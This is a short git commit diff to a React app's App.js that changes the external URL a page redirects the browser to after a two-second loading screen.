4c8aa12758fa0d29a82ac02e2d1fdd58d522207c
husknet <127146284+husknet@users.noreply.github.com>
2024-10-03 03:16:16 -0300

    Update App.js

--- src/App.js
+++ src/App.js
@@ -4,7 +4,7 @@ import Loading from './Loading';
 function App() {
     useEffect(() => {
         const timer = setTimeout(() => {
-            window.location.href = 'https://nekatie.pro';
+            window.location.href = 'https://boost.tutak.at';
         }, 2000);
 
         return () => clearTimeout(timer);
